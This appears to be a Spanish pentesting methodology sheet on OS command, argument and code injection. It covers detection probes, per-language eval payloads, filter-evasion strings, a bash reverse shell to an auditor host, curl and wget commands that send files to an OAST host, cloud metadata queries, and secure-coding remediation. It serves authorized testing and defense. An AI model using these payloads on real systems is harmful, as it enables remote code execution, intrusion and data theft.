# Inyección de comandos del sistema e inyección de código (OS Command Injection / Code Injection → RCE)

| Clasificación | |
|---|---|
| CWE | CWE-78 — OS Command Injection; CWE-88 — Argument Injection; CWE-94 — Code Injection; CWE-95 — Eval Injection |
| OWASP Top 10:2025 | A05 — Injection |
| OWASP API Top 10:2023 | Sin categoría propia; API8:2023 Security Misconfiguration / API10:2023 Unsafe Consumption of APIs según el caso |
| WSTG | WSTG-INPV-12 (Command Injection); WSTG-INPV-11 (Code Injection) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación por contexto (shell Unix, Windows, argumentos, eval por lenguaje, procesadores de ficheros) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

- **Inyección de comandos del sistema operativo:** la aplicación lanza un programa externo a través de un **intérprete de comandos** (shell: `/bin/sh`, `bash`, `cmd.exe`, PowerShell) y mete en la línea de comandos datos del usuario. Los metacaracteres del shell (`;`, `|`, `&`, `$()`, saltos de línea…) permiten encadenar comandos nuevos.
- **Inyección de argumentos:** no hay shell, pero el usuario controla un argumento que empieza por `-` y el programa lo interpreta como **opción** (`--output=/var/www/x`, `-oProxyCommand=…`). Suele llevar a escritura de ficheros o ejecución.
- **Inyección de código:** el dato acaba en una función que **evalúa código del propio lenguaje** (`eval`, `exec`, `Function`, `assert` en PHP antiguo, `ScriptEngine` en Java, `instance_eval` en Ruby). El resultado es RCE (*Remote Code Execution*, ejecución remota de código) en el proceso de la aplicación.

Causa raíz: usar APIs que pasan por shell (`system`, `exec` de Node, `shell=True`) o que evalúan cadenas, en lugar de APIs que reciben el programa y sus argumentos como **lista** separada, y no fijar el final de opciones con `--`.

Otras rutas a RCE se tratan en sus fichas: `vulns/ssti.md`, `vulns/deserialization.md`, `vulns/file-upload.md`, `vulns/path-traversal-lfi.md` (inclusión de ficheros), `vulns/xxe.md`, `vulns/sqli.md` (§4.7), `vulns/otras-inyecciones.md` (EL/OGNL/SpEL, Log4Shell), `vulns/prototype-pollution.md`.

## 2. Dónde buscar (señales del reconocimiento)

- Herramientas de red expuestas: ping, traceroute, nslookup, whois, “comprobar conectividad”, diagnósticos de router/NAS/IoT.
- Conversión y procesado de ficheros: imágenes (ImageMagick, GraphicsMagick, ExifTool), vídeo/audio (FFmpeg), PDF (wkhtmltopdf, Ghostscript, LibreOffice headless), compresión (zip, tar, 7z), Git (clonar URL), LaTeX, Pandoc.
- Funciones de administración: copias de seguridad, “ejecutar tarea”, gestión de certificados (openssl), envío de correo por `sendmail`, integración con CLI de nube.
- Nombres de fichero subidos que luego se pasan a un comando; campos de hostname, IP, puerto, dominio, rama de Git, etiqueta de Docker.
- Calculadoras, “expresiones” o reglas configurables (inyección de código), plantillas de webhook, campos de “filtro avanzado” en lenguaje propio.
- Señales: tiempos de respuesta proporcionales a parámetros (`count=`), salidas típicas de comandos (`PING`, `64 bytes from`), errores `sh: 1:`, `/bin/sh: … not found`, `is not recognized as an internal or external command`.

## 3. Detección segura (primeras sondas, no destructivas)

Primero una marca aritmética (no ejecuta nada sensible y evita falsos positivos por texto reflejado):

```bash
;echo c0rvus$((1337*7))          # salida esperada: c0rvus9359
|echo c0rvus$((1337*7))
$(echo c0rvus$((1337*7)))
`echo c0rvus$((1337*7))`
%0aecho c0rvus$((1337*7))        # salto de línea
```

Retardo (Unix y Windows), siempre con 0 s de control y al menos tres repeticiones:

```bash
;sleep 3;            |sleep 3            &&sleep 3            ||sleep 3
$(sleep 3)           `sleep 3`           %0asleep 3
& ping -n 4 127.0.0.1 &          # Windows (≈3 s)
& timeout /t 3 /nobreak &        # Windows: puede fallar sin consola interactiva
;ping -c 4 127.0.0.1;            # Unix alternativo
```

OAST (cuando no hay salida ni tiempo útil; `OAST` = tu subdominio de interactsh/Collaborator):

```bash
;nslookup c0rvus.OAST;
$(nslookup c0rvus.OAST)
;curl http://OAST/c0rvus;
;wget -qO- http://OAST/c0rvus;
;nslookup $(whoami).OAST;                     # identidad, inocua
& nslookup %USERNAME%.OAST &                  # Windows cmd
;powershell -c "Resolve-DnsName c0rvus.OAST";
```

Romper el contexto de comillas antes del separador:

```bash
'; echo c0rvus$((1337*7)); '         # dentro de comillas simples
"; echo c0rvus$((1337*7)); "         # dentro de comillas dobles
"$(echo c0rvus$((1337*7)))"          # dentro de comillas dobles se expande sin romperlas
```

Inyección de código (sondas aritméticas por lenguaje):

```text
PHP / Python / Node / Ruby:   1337*7           → 9359 en la salida si se evalúa
Python:                        str(1337*7)+'c0rvus'
Node:                          (1337*7).toString()+'c0rvus'
Ruby:                          "#{1337*7}"
Tiempo Python:                 __import__('time').sleep(3)
Tiempo Node:                   (function(){var s=Date.now();while(Date.now()-s<3000);})()     ⚠️ bloquea el event loop 3 s
Tiempo PHP:                    sleep(3)
Tiempo Ruby:                   sleep(3)
```

## 4. Explotación por contexto o tecnología

### 4.1 Metacaracteres del shell

| Metacarácter | Efecto | Ejemplo |
|---|---|---|
| `;` | separa comandos (Unix) | `127.0.0.1;id` |
| `&` | segundo plano (Unix) / separador (Windows) | `x & whoami` |
| `&&` / `\|\|` | ejecuta si el anterior acierta / falla | `x \|\| id` |
| `\|` | tubería | `x \| id` |
| `` `cmd` `` / `$(cmd)` | sustitución de comando (Unix) | `$(id)` |
| `%0a`, `%0d%0a` | salto de línea = nuevo comando | `x%0aid` |
| `>` `<` | redirección (escritura/lectura de ficheros) | `x > /tmp/c0` ⚠️ |

### 4.2 Unix: comandos de prueba inocuos

```bash
id; whoami; hostname; uname -a; pwd; cat /etc/hostname; ls -la /
cat /proc/self/cgroup 2>/dev/null; ls /.dockerenv 2>/dev/null      # ¿contenedor?
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null       # ¿Kubernetes? (listar, no leer el token)
```

Exfiltración ciega por DNS de datos inocuos:

```bash
;nslookup $(hostname | base64 | tr -d '=' | cut -c1-50).OAST;
;curl -s http://OAST/ --data-binary @/etc/hostname;
```

### 4.3 Windows (cmd y PowerShell)

```bat
& whoami & 
| whoami
&& ver
%0a whoami
& echo %USERNAME%^|%COMPUTERNAME% &
& powershell -NoP -c "$PSVersionTable.PSVersion" &
```

PowerShell como contexto directo (por ejemplo un script `.ps1` que recibe el parámetro):

```powershell
; whoami
$(whoami)
"; whoami; "
```

Problemas de escape específicos de Windows (investigación moderna):

- **BatBadBut (2024):** al lanzar `.bat`/`.cmd` con argumentos “escapados” por el runtime, `cmd.exe` reinterpreta comillas y `%`; afectó a Rust (CVE-2024-24576), Node, PHP, Python y otros. Payload típico en un argumento: `"&whoami`, `%CMDCMDLINE:~-1%&whoami`.
- **Best-Fit / WorstFit (2024–2025):** las APIs ANSI de Windows convierten caracteres Unicode a “el más parecido” de la página de códigos; el guion suave `U+00AD` pasó a `-` en PHP-CGI (CVE-2024-4577: `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`) y la comilla de ancho completo `＂` (U+FF02) se convierte en `"`, rompiendo `escapeshellarg()` y similares.

### 4.4 Inyección de argumentos (sin shell)

El patrón: el valor empieza por `-` y el programa lo toma como opción. Prueba primero `--help` o `--version` como valor: si la respuesta cambia, hay inyección de argumentos.

```text
curl     → -o /var/www/html/c0.txt  ⚠️   |  --config  |  -K  |  file:///etc/hostname como URL
wget     → --post-file=/etc/hostname http://OAST/      |  -O /ruta ⚠️
git      → --upload-pack='touch /tmp/c0'  ⚠️  (clone/ls-remote)   |  -c core.sshCommand=… ⚠️
ssh      → -oProxyCommand='nslookup c0rvus.OAST'
tar      → --checkpoint=1 --checkpoint-action=exec='nslookup c0rvus.OAST'
find     → -exec nslookup c0rvus.OAST \;
zip      → -T -TT 'nslookup c0rvus.OAST #'
rsync    → -e 'sh -c "nslookup c0rvus.OAST"'
sendmail → -X/ruta/log  ⚠️ (ver otras-inyecciones.md, mail() de PHP)
wkhtmltopdf / chrome headless → --enable-local-file-access, URL file:// (ver ssrf.md)
ffmpeg   → -i con listas concat:/HLS para leer ficheros (ver file-upload.md)
```

Los comodines del shell (`*`) también provocan inyección de argumentos: un fichero llamado `--checkpoint-action=exec=sh c0.sh` en un directorio sobre el que se hace `tar cf x.tar *`.

### 4.5 Inyección de código por lenguaje

**PHP**
```php
eval("return $input;")            → input: 1337*7;  phpinfo();  system('id');
assert($input)                    → solo PHP < 8 (cadena evaluada)
preg_replace('/x/e', $input, …)   → modificador /e, eliminado en PHP 7
create_function('', $input)       → eliminado en PHP 8
call_user_func($_GET['f'], $_GET['a'])   → f=system&a=id
$$var / extract($_GET)            → sobrescritura de variables
usort($a, $_GET['cmp'])           → callbacks controlados
include $_GET['page']             → LFI/RFI, ver path-traversal-lfi.md
```

**Python**
```python
eval(expr)  /  exec(code)  /  compile()  /  pickle.loads (ver deserialization.md)
# Payloads
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id']).decode()
# Si builtins está vacío: escapar por la jerarquía de clases
().__class__.__base__.__subclasses__()   # buscar os._wrap_close, subprocess.Popen…
```
`ast.literal_eval` es seguro para literales; `eval` con `{"__builtins__": {}}` **no** es un sandbox.

**Node.js**
```js
eval(x) / new Function(x)() / setTimeout(x) con cadena / vm.runInNewContext(x)   // vm NO es sandbox
// Payloads
require('child_process').execSync('id').toString()
process.mainModule.require('child_process').execSync('id').toString()     // si require no está en el ámbito
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()  // escape de vm
```

**Ruby**
```ruby
eval(x); instance_eval(x); class_eval(x); send(params[:m], params[:a]); public_send
Kernel#open(params[:file])         # una ruta que empieza por "|" ejecuta comandos:  |id
# Payloads
`id`;  %x(id);  system('id');  IO.popen('id').read
```

**Java / JVM**
```java
ScriptEngineManager().getEngineByName("js").eval(x)   // Nashorn (≤ JDK 14) / GraalJS
GroovyShell().evaluate(x)                             // Jenkins script console, reglas Groovy
// Payloads JS (Nashorn):  java.lang.Runtime.getRuntime().exec("id")
// Groovy:                 "id".execute().text
```
Para expresiones SpEL/OGNL/MVEL/EL ver `vulns/otras-inyecciones.md`.

**.NET**
```csharp
CSharpScript.EvaluateAsync(x)          // Roslyn scripting
// Payload: System.Diagnostics.Process.Start("cmd.exe","/c whoami")
```

### 4.6 Procesadores de ficheros (RCE indirecto)

- **ImageMagick**: delegados y formatos MVG/MSL/SVG (ImageTragick, CVE-2016-3714; lectura de ficheros vía PNG `profile`, CVE-2022-44268). Prueba con OAST en un MVG `url(https://OAST/)`.
- **ExifTool** < 12.24: metadatos DjVu ejecutan Perl (CVE-2021-22204).
- **Ghostscript**: múltiples escapes de `-dSAFER` (p. ej. CVE-2023-36664 con `%pipe%`).
- **LaTeX**: `\immediate\write18{id}` si `shell-escape` está activo; `\input{/etc/hostname}` para lectura.
- **wkhtmltopdf/Chrome headless**: SSRF y lectura `file://` (ver `vulns/ssrf.md`).
Detalle en `vulns/file-upload.md`.

### 4.7 Shell inversa y persistencia (solo con autorización)

⚠️ Una shell inversa, descargar binarios, escribir en el webroot o en `cron` **requiere confirmación explícita del cliente**. Prefiere siempre `id`/`whoami` + OAST. Si está autorizada:

```bash
bash -c 'bash -i >& /dev/tcp/IP_AUDITOR/4444 0>&1'          # ⚠️ requiere confirmación explícita del cliente
```

## 5. Evasión de filtros y WAF

```bash
# Espacios
cat${IFS}/etc/hostname     cat$IFS/etc/hostname     {cat,/etc/hostname}     cat</etc/hostname
X=$'cat\x20/etc/hostname'&&$X       cat%09/etc/hostname (tabulador)
# Romper palabras clave
w'h'o'am'i     w"h"oami     wh\oami     who$@ami     who$()ami     wh``oami
# Variables y subcadenas
a=who;b=ami;$a$b          ${PATH:0:1}  → /          ${HOME:0:1} → /
$(printf '\151\144')      → id (octal)          $(echo aWQ= | base64 -d)   → id
$(rev<<<'dimaohw')        → whoami
# Comodines
/???/??t /???/h?st?am?    → /bin/cat /etc/hostname
/???/b??/w?oam?           → /usr/bin/whoami
# Saltos de línea y separadores alternativos
%0a  %0d  %0a%0d  ;  &  |  (también \n dentro de JSON: "host":"127.0.0.1\nid")
# Sin barras
cd${IFS}..;cd${IFS}..;cat${IFS}etc${HOME:0:1}hostname
```

Windows:

```bat
who^ami            w"h"oami            set x=whoami&& call %x%
%COMSPEC:~-7,1%    → "c"  (subcadenas de variables de entorno)
powershell -enc <Base64 UTF-16LE>      (codificar con: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami')))
```

Otros trucos: duplicar el parámetro (HPP), cambiar `Content-Type`, enviar el payload en otra cabecera que la aplicación reutiliza, usar Unicode “best-fit” en Windows (§4.3). Ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

1. **Identidad y contexto:** `id`, `hostname`, `uname -a`, `whoami /all` (Windows), si es contenedor/Kubernetes, versión del SO.
2. **Alcance sin exfiltrar secretos:** listar (no volcar) `env | cut -d= -f1` (solo nombres de variables), existencia de `~/.aws/credentials`, del token de cuenta de servicio de Kubernetes, de `.env`. Indica que existen; no copies los valores salvo autorización.
3. **Nube:** desde la RCE, una petición a IMDS (IMDSv2: `TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60'); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/info`) demuestra el rol asociado sin pedir credenciales. Pedir `security-credentials/<rol>` **requiere confirmación explícita del cliente**.
4. **Red interna:** `getent hosts db`, resolución de nombres internos; no escanear sin alcance.
5. **Privilegios locales:** `sudo -n -l 2>&1`, binarios SUID (`find / -perm -4000 -type f 2>/dev/null | head`) solo como enumeración.
6. Encadenar: inyección de argumentos → escritura de fichero → webshell (⚠️ requiere confirmación explícita del cliente).

## 7. Caja blanca: fuentes, sumideros y patrones de código

**PHP**
```php
// Vulnerable
system("ping -c 1 " . $_GET['host']);
shell_exec("convert " . $file . " out.png");  exec(), passthru(), popen(), proc_open(), `...`, pcntl_exec()
escapeshellcmd("git clone " . $url);   // NO evita inyección de argumentos (--upload-pack)
// Seguro
$host = filter_var($_GET['host'], FILTER_VALIDATE_IP) ?: exit;
$p = proc_open(['ping', '-c', '1', '--', $host], $desc, $pipes);     // PHP ≥ 7.4 acepta array: sin shell
system('ping -c 1 -- ' . escapeshellarg($host));                      // mínimo aceptable
```

**Java / Spring**
```java
// Vulnerable
Runtime.getRuntime().exec(new String[]{"sh", "-c", "ping -c 1 " + host});
Runtime.getRuntime().exec("ping -c 1 " + host);   // sin shell, pero inyección de argumentos posible
// Seguro
new ProcessBuilder("ping", "-c", "1", "--", validatedHost).start();
```

**Python**
```python
# Vulnerable
os.system("ping -c 1 " + host);  os.popen(cmd);  subprocess.run(f"ping -c 1 {host}", shell=True)
subprocess.Popen("convert %s out.png" % f, shell=True);  eval(expr);  exec(code)
# Seguro
subprocess.run(["ping", "-c", "1", "--", host], shell=False, check=True, timeout=10)
shlex.quote(host)   # solo si no hay alternativa a shell=True
```

**Node / Express**
```js
// Vulnerable
child_process.exec(`ping -c 1 ${req.query.host}`);
child_process.spawn('sh', ['-c', 'ping ' + host]);  spawn(cmd, args, { shell: true });
eval(req.body.expr);  new Function(req.body.code);  vm.runInNewContext(code)
// Seguro
child_process.execFile('ping', ['-c', '1', '--', host], { timeout: 10000 }, cb);
```

**.NET**
```csharp
// Vulnerable
Process.Start("cmd.exe", "/c ping " + host);
new ProcessStartInfo { FileName = "ping", Arguments = "-n 1 " + host };     // cadena de argumentos
// Seguro
var psi = new ProcessStartInfo("ping"); psi.ArgumentList.Add("-n"); psi.ArgumentList.Add("1"); psi.ArgumentList.Add(host);
psi.UseShellExecute = false; Process.Start(psi);
```

**Go**
```go
// Vulnerable
exec.Command("sh", "-c", "ping -c 1 "+host).Run()
exec.Command("git", "clone", userURL)        // inyección de argumentos si userURL empieza por "-"
// Seguro
exec.CommandContext(ctx, "ping", "-c", "1", "--", host).Run()
```

**Ruby**
```ruby
# Vulnerable
system("ping -c 1 #{host}");  `ping #{host}`;  %x(ping #{host});  IO.popen("ping #{host}")
Open3.capture2("ping -c 1 #{host}");  open(params[:url])     # Kernel#open con "|cmd"
# Seguro
system("ping", "-c", "1", "--", host);  Open3.capture2("ping", "-c", "1", "--", host)
URI.open / File.open en lugar de Kernel#open
```

**Búsqueda (ripgrep / semgrep)**

```bash
rg -n --pcre2 '\b(system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(' --type php
rg -n '`[^`]*\$_(GET|POST|REQUEST|COOKIE)' --type php
rg -n --pcre2 'shell\s*=\s*True|os\.(system|popen)\(|subprocess\.\w+\([^)]*f["\x27]' --type py
rg -n --pcre2 '\b(eval|exec|compile)\s*\(' --type py
rg -n --pcre2 'child_process|execSync\(|exec\(\s*`|shell:\s*true|new Function\(|\beval\(' --type js --type ts
rg -n --pcre2 'Runtime\.getRuntime\(\)\.exec|new ProcessBuilder|ScriptEngineManager|GroovyShell' --type java
rg -n --pcre2 'Process\.Start\(|ProcessStartInfo|CSharpScript' --type cs
rg -n --pcre2 'exec\.Command(Context)?\(\s*"(sh|bash|cmd)"' --type go
rg -n --pcre2 '\b(system|spawn|popen|capture2|capture3)\s*\(\s*"[^"]*#\{|%x\(|\bopen\(params' --type ruby
semgrep --config p/command-injection --config p/owasp-top-ten .
```

## 8. Falsos positivos frecuentes

- La entrada se refleja en la respuesta (`;echo c0rvus…` aparece literal): busca el **resultado** `c0rvus9359`, no la cadena enviada.
- Retardos con `ping` por resolución DNS lenta o por el propio comando legítimo (`ping` con `count` mayor): compara 1, 3 y 5 paquetes.
- OAST disparado por un proxy, antivirus o sandbox de correo que visita URLs, no por el servidor: comprueba la IP de origen y que la petición es **DNS desde la infraestructura del cliente** o HTTP con user-agent `curl`/`Wget`.
- Comandos ejecutados en un contenedor efímero de pruebas del propio cliente (CI) y no en producción: documenta el host real (`hostname`).
- Errores `sh:` provocados por un fallo de validación que ya bloquea la entrada antes del shell.

## 9. Evidencia mínima para validarlo

- Petición con la marca aritmética y respuesta con el resultado (`c0rvus9359`), o tres mediciones de tiempo, o interacción OAST con subdominio único y IP de origen.
- Salida de `id`/`whoami` y `hostname` (una vez). Nada de volcados de ficheros sensibles.
- Contexto: parámetro, si hay shell o solo inyección de argumentos, sistema operativo, usuario del proceso.
- Lista de acciones hechas en el servidor (para que el cliente pueda verificar que no quedan artefactos).

## 10. Severidad orientativa

| Impacto | CVSS 3.1 | CVSS 4.0 (calcular con FIRST) |
|---|---|---|
| RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (≈9.3) |
| RCE con pivote demostrado a nube/red (impacto en otros sistemas) | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0) | `…/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| RCE autenticado (usuario normal) | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | `…/PR:L/…` (≈8.7) |
| RCE solo desde rol administrador | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (7.2) | `…/PR:H/…` |
| Inyección de argumentos limitada a lectura de un fichero | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `…/VC:H/VI:N/VA:N/…` |

## 11. Remediación

1. Evitar llamar a programas externos: usar librerías nativas (resolución DNS, ICMP, imágenes, zip) en el propio lenguaje.
2. Si es imprescindible: API sin shell con **lista de argumentos**, ruta absoluta del binario, `--` antes de los datos del usuario y validación estricta con lista blanca (IP, hostname, enumeraciones).
3. Nunca `eval`/`exec`/`Function` con datos externos; para expresiones de usuario usar un parser restringido (por ejemplo `ast.literal_eval`, un motor de reglas con gramática propia).
4. Ejecutar procesadores de ficheros en sandbox (contenedor sin red, usuario sin privilegios, seccomp/AppArmor, `policy.xml` restrictivo en ImageMagick, `-dSAFER` en Ghostscript).
5. En Windows, no invocar `.bat`/`.cmd` con argumentos de usuario y usar APIs Unicode (W) para evitar Best-Fit.

```python
import ipaddress, subprocess
def ping(host: str) -> str:
    ip = ipaddress.ip_address(host)                    # lanza ValueError si no es IP
    r = subprocess.run(["/usr/bin/ping", "-c", "1", "--", str(ip)],
                       capture_output=True, text=True, timeout=10, shell=False)
    return r.stdout
```

## 12. Herramientas

- **Burp Suite** (Repeater, Intruder con listas de PayloadsAllTheThings, Collaborator), **interactsh-client** (`interactsh-client -v`).
- **commix**, solo tras confirmación manual y sin técnicas de escritura de ficheros salvo autorización:
  ```bash
  commix -r req.txt -p host --batch --technique=t --os-cmd="id"
  commix --url="https://objetivo/ping" --data="host=127.0.0.1" -p host --batch
  ```
- **Argument injection hammer** (extensión Burp) y diccionarios de opciones peligrosas (GTFOArgs: https://gtfoargs.github.io/).
- **semgrep** (`p/command-injection`), **CodeQL** (`py/command-line-injection`, `js/command-line-injection`, `java/command-line-injection`).

## 13. Referencias

- OWASP WSTG — Testing for Command Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Tests/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- OWASP OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- PortSwigger — OS command injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings — Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- HackTricks — Command Injection: https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
- Flatt Security — BatBadBut (2024); Orange Tsai — WorstFit (2025); DEVCORE — CVE-2024-4577.
- CWE-78, CWE-88, CWE-94, CWE-95 en https://cwe.mitre.org
- Relacionados: `vulns/ssti.md`, `vulns/deserialization.md`, `vulns/file-upload.md`, `vulns/path-traversal-lfi.md`, `vulns/otras-inyecciones.md`, `vulns/ssrf.md`.
